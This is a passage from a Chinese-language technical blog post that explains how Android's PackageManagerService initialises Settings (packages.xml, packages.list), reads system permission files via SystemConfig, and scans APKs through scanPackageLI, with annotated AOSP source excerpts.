<li>扫描/data/app-private目录下的apk;</li>
</ul>
<p><strong>4. PMS_SCAN_END阶段：</strong></p>
<ul>
<li>将上述信息写回/data/system/packages.xml;</li>
</ul>
<p><strong>5. PMS_READY阶段：</strong></p>
<ul>
<li>创建服务PackageInstallerService；</li>
</ul>
<p>到这里，大致介绍完了整个PMS构造函数的流程，基本上PMS_SCAN_END阶段我们apk就算安装完成了，那么接下来我们单独看看其中几个比较重要的模块：</p>
<ul>
<li>Settings</li>
<li>SystemConfig - readPermissions </li>
<li>scanPackageLI</li>
</ul>
<h1 id="五、Settings"><a href="#五、Settings" class="headerlink" title="五、Settings"></a>五、Settings</h1><p>在BOOT_PROGRESS_PMS_START阶段，我们会创建Setting对象，以及一堆的addSharedUserLPw调用：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mSettings = <span class="keyword">new</span> Settings(mPackages);</div><div class="line">mSettings.addSharedUserLPw(<span class="string">"android.uid.system"</span>, Process.SYSTEM_UID,</div><div class="line">    ApplicationInfo.FLAG_SYSTEM, ApplicationInfo.PRIVATE_FLAG_PRIVILEGED);</div></pre></td></tr></table></figure></p>
<h2 id="5-1-创建Settings"><a href="#5-1-创建Settings" class="headerlink" title="5.1 创建Settings"></a>5.1 创建Settings</h2><blockquote>
<p>frameworks/base/services/core/java/com/android/server/pm/Settings.java</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">Settings(Object lock) &#123;</div><div class="line">    <span class="keyword">this</span>(Environment.getDataDirectory(), lock);</div><div class="line">&#125;</div><div class="line"></div><div class="line">Settings(File dataDir, Object lock) &#123;</div><div class="line">    mLock = lock;</div><div class="line"></div><div class="line">    mRuntimePermissionsPersistence = <span class="keyword">new</span> RuntimePermissionPersistence(mLock);</div><div class="line"></div><div class="line">    <span class="comment">//创建目录"data/system"</span></div><div class="line">    mSystemDir = <span class="keyword">new</span> File(dataDir, <span class="string">"system"</span>);</div><div class="line">    mSystemDir.mkdirs();</div><div class="line">    FileUtils.setPermissions(mSystemDir.toString(),</div><div class="line">            FileUtils.S_IRWXU|FileUtils.S_IRWXG</div><div class="line">            |FileUtils.S_IROTH|FileUtils.S_IXOTH,</div><div class="line">            -<span class="number">1</span>, -<span class="number">1</span>);</div><div class="line">    <span class="comment">// packages.xml和packages-backup.xml为一组，用于描述系统所安装的Package信息，</span></div><div class="line">    <span class="comment">// 其中packages-backup.xml是packages.xml的备份</span></div><div class="line">    <span class="comment">// PMS写把数据写到backup文件中，信息全部写成功后在改名为非backup文件，</span></div><div class="line">    <span class="comment">// 以防止在写文件的过程中出错，导致信息丢失</span></div><div class="line">    mSettingsFilename = <span class="keyword">new</span> File(mSystemDir, <span class="string">"packages.xml"</span>);</div><div class="line">    mBackupSettingsFilename = <span class="keyword">new</span> File(mSystemDir, <span class="string">"packages-backup.xml"</span>);</div><div class="line"></div><div class="line">    <span class="comment">//packages.list保存系统中存在的所有非系统自带的APK信息，即UID大于10000的apk</span></div><div class="line">    mPackageListFilename = <span class="keyword">new</span> File(mSystemDir, <span class="string">"packages.list"</span>);</div><div class="line">    FileUtils.setPermissions(mPackageListFilename, <span class="number">0640</span>, SYSTEM_UID, PACKAGE_INFO_GID);</div><div class="line"></div><div class="line">    <span class="comment">//感觉是sdcardfs相关的文件</span></div><div class="line">    <span class="keyword">final</span> File kernelDir = <span class="keyword">new</span> File(<span class="string">"/config/sdcardfs"</span>);</div><div class="line">    mKernelMappingFilename = kernelDir.exists() ? kernelDir : <span class="keyword">null</span>;</div><div class="line"></div><div class="line">    <span class="comment">// Deprecated: Needed for migration</span></div><div class="line">    <span class="comment">//packages-stopped.xml用于描述系统中强行停止运行的package信息，backup也是备份文件</span></div><div class="line">    mStoppedPackagesFilename = <span class="keyword">new</span> File(mSystemDir, <span class="string">"packages-stopped.xml"</span>);</div><div class="line">    mBackupStoppedPackagesFilename = <span class="keyword">new</span> File(mSystemDir, <span class="string">"packages-stopped-backup.xml"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Settings的构造函数主要用于创建”data/system”目录和一些xml文件，并配置相应的权限,其中：</p>
<ul>
<li>packages.xml 记录所有安装app的信息，当系统进行程序安装、卸载和更新等操作时，均会更新该文件。</li>
<li>packages-backup.xml 备份文件</li>
<li>packages-stopped.xml 记录被用户强行停止的应用的Package信息</li>
<li>packages-stopped-backup.xml 备份文件</li>
<li>packages.list 记录非系统自带的APK的数据信息，这些APK有变化时会更新该文件</li>
</ul>
<h2 id="5-2-Setings-readLPw"><a href="#5-2-Setings-readLPw" class="headerlink" title="5.2 Setings.readLPw"></a>5.2 Setings.readLPw</h2><p>readLPw()函数，从/data/system/packages.xml或packages-backup.xml文件中获得packages、permissions相关信息，添加到相关内存列表中。packages.xml文件记录了系统的permisssions以及每个APK的name、codePath、flags、version等信息这些信息主要通过APK的AndroidManifest.xml解析获取，解析完APK后将更新信息写入这个文件，下次开机直接从里面读取相关信息添加到内存相关结构中。当有APK升级、安装或删除时会更新这个文件。</p>
<h2 id="5-3-Settings-writeLPr"><a href="#5-3-Settings-writeLPr" class="headerlink" title="5.3 Settings.writeLPr"></a>5.3 Settings.writeLPr</h2><p>writeLPr函数，将解析出的每个APK的信息（mSetting.mPackages）保存到packages.xml和packages.list文件。packages.list记录了如下数据：pkgName, userId, debugFlag, dataPath(包的数据路径)。</p>
<h1 id="六、SystemConfig-readPermissions"><a href="#六、SystemConfig-readPermissions" class="headerlink" title="六、SystemConfig - readPermissions"></a>六、SystemConfig - readPermissions</h1><p>同样是在BOOT_PROGRESS_PMS_START阶段，我们会初始化SystemConfig去获取系统配置信息：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 获取系统配置信息</span></div><div class="line">SystemConfig systemConfig = SystemConfig.getInstance();</div><div class="line">mGlobalGids = systemConfig.getGlobalGids();</div><div class="line">mSystemPermissions = systemConfig.getSystemPermissions();</div><div class="line">mAvailableFeatures = systemConfig.getAvailableFeatures();</div></pre></td></tr></table></figure>
<h2 id="6-1-创建SystemConfig"><a href="#6-1-创建SystemConfig" class="headerlink" title="6.1 创建SystemConfig"></a>6.1 创建SystemConfig</h2><blockquote>
<p>frameworks/base/services/core/java/com/android/server/SystemConfig.java</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//单例模式</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SystemConfig <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">synchronized</span> (SystemConfig.class) &#123;</div><div class="line">        <span class="keyword">if</span> (sInstance == <span class="keyword">null</span>) &#123;</div><div class="line">            sInstance = <span class="keyword">new</span> SystemConfig();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> sInstance;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">SystemConfig() &#123;</div><div class="line"></div><div class="line">    <span class="comment">// system/etc/目录</span></div><div class="line">    readPermissions(Environment.buildPath(</div><div class="line">            Environment.getRootDirectory(), <span class="string">"etc"</span>, <span class="string">"sysconfig"</span>), ALLOW_ALL);</div><div class="line">    readPermissions(Environment.buildPath(</div><div class="line">            Environment.getRootDirectory(), <span class="string">"etc"</span>, <span class="string">"permissions"</span>), ALLOW_ALL);</div><div class="line"></div><div class="line">    <span class="keyword">int</span> odmPermissionFlag = ALLOW_LIBS | ALLOW_FEATURES | ALLOW_APP_CONFIGS;</div><div class="line">    </div><div class="line">    <span class="comment">// odm/etc/目录</span></div><div class="line">    readPermissions(Environment.buildPath(</div><div class="line">            Environment.getOdmDirectory(), <span class="string">"etc"</span>, <span class="string">"sysconfig"</span>), odmPermissionFlag);</div><div class="line">    readPermissions(Environment.buildPath(</div><div class="line">            Environment.getOdmDirectory(), <span class="string">"etc"</span>, <span class="string">"permissions"</span>), odmPermissionFlag);</div><div class="line"></div><div class="line">    <span class="comment">// oem/etc/目录</span></div><div class="line">    readPermissions(Environment.buildPath(</div><div class="line">        Environment.getOemDirectory(), <span class="string">"etc"</span>, <span class="string">"sysconfig"</span>), ALLOW_FEATURES);</div><div class="line">    readPermissions(Environment.buildPath(</div><div class="line">        Environment.getOemDirectory(), <span class="string">"etc"</span>, <span class="string">"permissions"</span>), ALLOW_FEATURES);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>从上面的代码可以看出，SystemConfig是单例模式，会通过readPermissions解析指定目录下的xml文件：</p>
<ul>
<li>/system/etc/sysconfig</li>
<li>/system/etc/permissions</li>
<li>/odm/etc/sysconfig</li>
<li>/odm/etc/permissions</li>
<li>/oem/etc/sysconfig</li>
<li>/oem/etc/permissions</li>
</ul>
<p>其中比较重要的是system/etc/permissions目录，该目录文件大多来源于代码中的<code>framworks/(base or native)/data/etc</code>，这些文件的作用是表明系统支持的feature有哪些，例如是否支持蓝牙、wifi、P2P等。</p>
<h2 id="6-2-readPermissions"><a href="#6-2-readPermissions" class="headerlink" title="6.2 readPermissions"></a>6.2 readPermissions</h2><p>readPermissions会循环去读取目录下的xml文件，但是它会跳过platform.xml文件，最后再去读取platform.xml文件。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">readPermissions</span><span class="params">(File libraryDir, <span class="keyword">int</span> permissionFlag)</span> </span>&#123;</div><div class="line">    <span class="comment">//检测目录是否存在，是否可读</span></div><div class="line">    ..........</div><div class="line">    <span class="comment">// Iterate over the files in the directory and scan .xml files</span></div><div class="line">    File platformFile = <span class="keyword">null</span>;</div><div class="line">    <span class="comment">//  循环解析xml文件</span></div><div class="line">    <span class="keyword">for</span> (File f : libraryDir.listFiles()) &#123;</div><div class="line">        <span class="comment">// 跳过，最后再解析platform.xml </span></div><div class="line">        <span class="keyword">if</span> (f.getPath().endsWith(<span class="string">"etc/permissions/platform.xml"</span>)) &#123;</div><div class="line">            platformFile = f;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// 解析可读的xml文件</span></div><div class="line">        readPermissionsFromXml(f, permissionFlag);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 最后解析platform.xml文件</span></div><div class="line">    <span class="keyword">if</span> (platformFile != <span class="keyword">null</span>) &#123;</div><div class="line">        readPermissionsFromXml(platformFile, permissionFlag);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们发现读取函数最后都调用了readPermissionsFromXml()，函数readPermissionsFromXml最终会使用XMLPullParser的方式解析这些XML文件，然后把解析出来的数据结构保存到PMS中。</p>
<h3 id="6-2-1-android-hardware-bluetooth-xml"><a href="#6-2-1-android-hardware-bluetooth-xml" class="headerlink" title="6.2.1 android.hardware.bluetooth.xml"></a>6.2.1 android.hardware.bluetooth.xml</h3><p>最终会解析并且保存到PMS的<code>final ArrayMap&lt;String, FeatureInfo&gt; mAvailableFeatures</code>中。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">permissions</span>&gt;</span>  </div><div class="line">    <span class="tag">&lt;<span class="name">feature</span> <span class="attr">name</span>=<span class="string">"android.hardware.bluetooth"</span> /&gt;</span>  </div><div class="line"><span class="tag">&lt;/<span class="name">permissions</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="6-2-2-com-android-location-provider-xml"><a href="#6-2-2-com-android-location-provider-xml" class="headerlink" title="6.2.2 com.android.location.provider.xml"></a>6.2.2 com.android.location.provider.xml</h3><p>指明了运行一些library时，还需要加载一些java库。<br>这个最终会解析并保存到PMS的<code>final ArrayMap&lt;String, SharedLibraryEntry&gt; mSharedLibraries</code>中。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">permissions</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">library</span> <span class="attr">name</span>=<span class="string">"com.android.location.provider"</span></span></div><div class="line">            <span class="attr">file</span>=<span class="string">"/system/framework/com.android.location.provider.jar"</span> /&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">permissions</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="6-2-3-platform-xml"><a href="#6-2-3-platform-xml" class="headerlink" title="6.2.3 platform.xml"></a>6.2.3 platform.xml</h3><p>这个文件中定义了底层GID和app层权限名字之间的对应关系，或者直接给某一个uid赋予对应的权限：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">permissions</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">permission</span> <span class="attr">name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span> &gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">group</span> <span class="attr">gid</span>=<span class="string">"sdcard_r"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">group</span> <span class="attr">gid</span>=<span class="string">"sdcard_rw"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">permission</span>&gt;</span></div><div class="line">    ......</div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">assign-permission</span> <span class="attr">name</span>=<span class="string">"android.permission.MODIFY_AUDIO_SETTINGS"</span> <span class="attr">uid</span>=<span class="string">"media"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">assign-permission</span> <span class="attr">name</span>=<span class="string">"android.permission.ACCESS_SURFACE_FLINGER"</span> <span class="attr">uid</span>=<span class="string">"media"</span> /&gt;</span></div><div class="line">    ......</div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">permissions</span>&gt;</span></div></pre></td></tr></table></figure>
<p>解析<code>&lt;permission&gt;</code>标签的时候，会创建一个PermissionEntry类，他关联了gids和permission name：<br>最终PermissionEntry会放入SystemConfig的<code>final ArrayMap&lt;String, PermissionEntry&gt; mPermissions</code>变量中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PermissionEntry</span> </span>&#123;</div><div class="line">        <span class="keyword">public</span> <span class="keyword">final</span> String name;</div><div class="line">        <span class="keyword">public</span> <span class="keyword">int</span>[] gids;</div><div class="line">        PermissionEntry(String _name) &#123;</div><div class="line">            name = _name;</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>解析<code>&lt;assign-permission&gt;</code>的时候表示把属性name中的字符串表示的权限赋予属性uid中的用户。uid和name则存入SystemConfig中的SparseArray&gt; 类型的<code>mSystemPermissions</code>变量中。</p>
<h1 id="七、scanPackageLI"><a href="#七、scanPackageLI" class="headerlink" title="七、scanPackageLI"></a>七、scanPackageLI</h1><p>scanPackageLI是比较重要的安装apk的方法，下面具体分析。</p>
<h2 id="7-1-scanDirLI"><a href="#7-1-scanDirLI" class="headerlink" title="7.1 scanDirLI"></a>7.1 scanDirLI</h2><p>scanDirLI函数会处理目录下每一个package文件：(当然不止scanDirLI最后会调用到scanPackageLI)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">scanDirLI</span><span class="params">(File dir, <span class="keyword">final</span> <span class="keyword">int</span> parseFlags, <span class="keyword">int</span> scanFlags, <span class="keyword">long</span> currentTime)</span> </span>&#123;</div><div class="line">    <span class="keyword">final</span> File[] files = dir.listFiles();</div><div class="line">    .......</div><div class="line">    <span class="keyword">for</span> (File file : files) &#123;</div><div class="line">        <span class="keyword">final</span> <span class="keyword">boolean</span> isPackage = (isApkFile(file) || file.isDirectory())</div><div class="line">                &amp;&amp; !PackageInstallerService.isStageName(file.getName());</div><div class="line">        <span class="keyword">if</span> (!isPackage) &#123;</div><div class="line">            <span class="comment">// Ignore entries which are not packages</span></div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            <span class="comment">//处理目录下每一个package文件</span></div><div class="line">            scanPackageTracedLI(file, parseFlags | PackageParser.PARSE_MUST_BE_APK,</div><div class="line">                    scanFlags, currentTime, <span class="keyword">null</span>);</div><div class="line">        &#125; <span class="keyword">catch</span> (PackageManagerException e) &#123;</div><div class="line">            .........</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>scanPackageTracedLI函数最终会调用到scanPackageLI函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> PackageParser.<span class="function">Package <span class="title">scanPackageTracedLI</span><span class="params">(File scanFile, <span class="keyword">final</span> <span class="keyword">int</span> parseFlags,</span></span></div><div class="line">        <span class="keyword">int</span> scanFlags, <span class="keyword">long</span> currentTime, UserHandle user) <span class="keyword">throws</span> PackageManagerException &#123;</div><div class="line">    Trace.traceBegin(TRACE_TAG_PACKAGE_MANAGER, <span class="string">"scanPackage"</span>);</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">return</span> scanPackageLI(scanFile, parseFlags, scanFlags, currentTime, user);</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        Trace.traceEnd(TRACE_TAG_PACKAGE_MANAGER);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="7-2-scanPackageLI安装apk"><a href="#7-2-scanPackageLI安装apk" class="headerlink" title="7.2 scanPackageLI安装apk"></a>7.2 scanPackageLI安装apk</h2><p>PackageManagerService的scanPackageLI过程scanPackageLI()有3个重载的方法，参数稍有不同：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 第（1）个</span></div><div class="line"><span class="keyword">private</span> PackageParser.<span class="function">Package <span class="title">scanPackageLI</span><span class="params">(File scanFile, <span class="keyword">int</span> parseFlags, <span class="keyword">int</span> scanFlags,</span></span></div><div class="line">        <span class="keyword">long</span> currentTime, UserHandle user)</div><div class="line"><span class="comment">// 第（2）个</span></div><div class="line"><span class="keyword">private</span> PackageParser.Package <span class="title">scanPackageLI</span><span class="params">(PackageParser.Package pkg, File scanFile,</span></div><div class="line">        <span class="keyword">final</span> <span class="keyword">int</span> policyFlags, <span class="keyword">int</span> scanFlags, <span class="keyword">long</span> currentTime, UserHandle user)</div><div class="line"><span class="comment">// 第（3）个</span></div><div class="line"><span class="keyword">private</span> PackageParser.Package <span class="title">scanPackageLI</span><span class="params">(PackageParser.Package pkg, <span class="keyword">final</span> <span class="keyword">int</span> policyFlags,</span></div><div class="line">        <span class="keyword">int</span> scanFlags, <span class="keyword">long</span> currentTime, UserHandle user)</div></pre></td></tr></table></figure>
<p><strong>（1）scanPackageLI(File scanFile, int parseFlags,…）函数</strong></p>
<ul>
<li>实例化一个PackageParser对象，接着调用该对象的parsePackage()对APK文件进行解析。</li>
<li>实例化一个Package对象，用于保存解析出的APK信息</li>
<li>从AndroidManifest.xml文件中解析出VersionCode、VersionName、installLocation等全局属性信息，然后根据标签循环解析XML文件包含的其它组成部分，将解析出的信息添加到Package对象的相关列表中。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> PackageParser.<span class="function">Package <span class="title">scanPackageLI</span><span class="params">(File scanFile, <span class="keyword">int</span> parseFlags, <span class="keyword">int</span> scanFlags,</span></span></div><div class="line">        <span class="keyword">long</span> currentTime, UserHandle user) <span class="keyword">throws</span> PackageManagerException &#123;</div><div class="line">    <span class="comment">//创建出PackageParser对象</span></div><div class="line">    PackageParser pp = <span class="keyword">new</span> PackageParser();</div><div class="line">    ...........</div><div class="line">    <span class="keyword">final</span> PackageParser.Package pkg;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="comment">// 解析package</span></div><div class="line">        pkg = pp.parsePackage(scanFile, parseFlags);</div><div class="line">    &#125; <span class="keyword">catch</span> (PackageParserException e) &#123;</div><div class="line">        ..........</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        ..........</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//调用第（2）个scanPackageLI</span></div><div class="line">    <span class="keyword">return</span> scanPackageLI(pkg, scanFile, parseFlags, scanFlags, currentTime, user);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最后会调用第（2）个scanPackageLI去继续解析。</p>
<p><strong>（2）scanPackageLI(PackageParser.Package pkg, File scanFile,…)函数</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> PackageParser.<span class="function">Package <span class="title">scanPackageLI</span><span class="params">(PackageParser.Package pkg, File scanFile,</span></span></div><div class="line">        <span class="keyword">final</span> <span class="keyword">int</span> policyFlags, <span class="keyword">int</span> scanFlags, <span class="keyword">long</span> currentTime, UserHandle user)</div><div class="line">        <span class="keyword">throws</span> PackageManagerException &#123;</div><div class="line">    </div><div class="line">    <span class="comment">//有childPackage时，第一次只执行检查的工作</span></div><div class="line">    <span class="keyword">if</span> ((scanFlags &amp; SCAN_CHECK_ONLY) == <span class="number">0</span>) &#123;</div><div class="line">        <span class="comment">//当解析一个Package的AndroidManifest.xml时，如果该XML文件中使用了"package"的tag</span></div><div class="line">        <span class="comment">//那么该tag对应的package是当前XML文件对应package的childPackage</span></div><div class="line">        <span class="keyword">if</span> (pkg.childPackages != <span class="keyword">null</span> &amp;&amp; pkg.childPackages.size() &gt; <span class="number">0</span>) &#123;</div><div class="line">            scanFlags |= SCAN_CHECK_ONLY;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="comment">//第二次进入，才开始实际的解析</span></div><div class="line">        scanFlags &amp;= ~SCAN_CHECK_ONLY;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">final</span> PackageParser.Package scannedPkg;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="comment">// Scan the parent</span></div><div class="line">        <span class="comment">//scanFlags将决定这一次是否仅执行检查工作</span></div><div class="line">        scannedPkg = scanPackageLI(pkg, policyFlags, scanFlags, currentTime, user);</div><div class="line"></div><div class="line">        <span class="keyword">final</span> <span class="keyword">int</span> childCount = (pkg.childPackages != <span class="keyword">null</span>) ? pkg.childPackages.size() : <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; childCount; i++) &#123;</div><div class="line">            PackageParser.Package childPkg = pkg.childPackages.get(i);</div><div class="line">            scanPackageLI(childPkg, policyFlags,</div><div class="line">                    scanFlags, currentTime, user);</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        .........   </div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ((scanFlags &amp; SCAN_CHECK_ONLY) != <span class="number">0</span>) &#123;</div><div class="line">        <span class="comment">//第一次检查完毕后，再次调用函数</span></div><div class="line">        <span class="keyword">return</span> scanPackageTracedLI(pkg, policyFlags, scanFlags, currentTime, user);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> scannedPkg;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>（3）scanPackageLI(PackageParser.Package pkg, final int policyFlags,…)函数</strong></p>
<p>最终会走到第三个scanPackageLI函数，这个函数最后会调用scanPackageDirtyLI函数，scanPackageDirtyLI是实际解析package的函数，这个才是真正干活的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> PackageParser.<span class="function">Package <span class="title">scanPackageLI</span><span class="params">(PackageParser.Package pkg, <span class="keyword">final</span> <span class="keyword">int</span> policyFlags,</span></span></div><div class="line">        <span class="keyword">int</span> scanFlags, <span class="keyword">long</span> currentTime, UserHandle user) <span class="keyword">throws</span> PackageManagerException &#123;</div><div class="line">    <span class="keyword">boolean</span> success = <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="comment">//实际的解析函数，很长...</span></div><div class="line">        <span class="keyword">final</span> PackageParser.Package res = scanPackageDirtyLI(pkg, policyFlags, scanFlags,</div><div class="line">                currentTime, user);</div><div class="line">        success = <span class="keyword">true</span>;</div><div class="line">        <span class="keyword">return</span> res;</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        ...........</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="7-3-scanPackageDirtyLI"><a href="#7-3-scanPackageDirtyLI" class="headerlink" title="7.3 scanPackageDirtyLI"></a>7.3 scanPackageDirtyLI</h2><p>通过上述的扫描过程，我们得到了当前apk文件对应的Package信息。不过这部分信息是存储在PackageParser中的，我们必须将这部分信息传递到PMS中。毕竟最终的目的是：<strong>让PMS能得到所有目录下Package的信息</strong>。<br>scanPackageDirtyLI函数主要就是把签名解析应用程序得到的package、provider、service、receiver和activity等信息保存在PackageManagerService相关的成员列表里。</p>
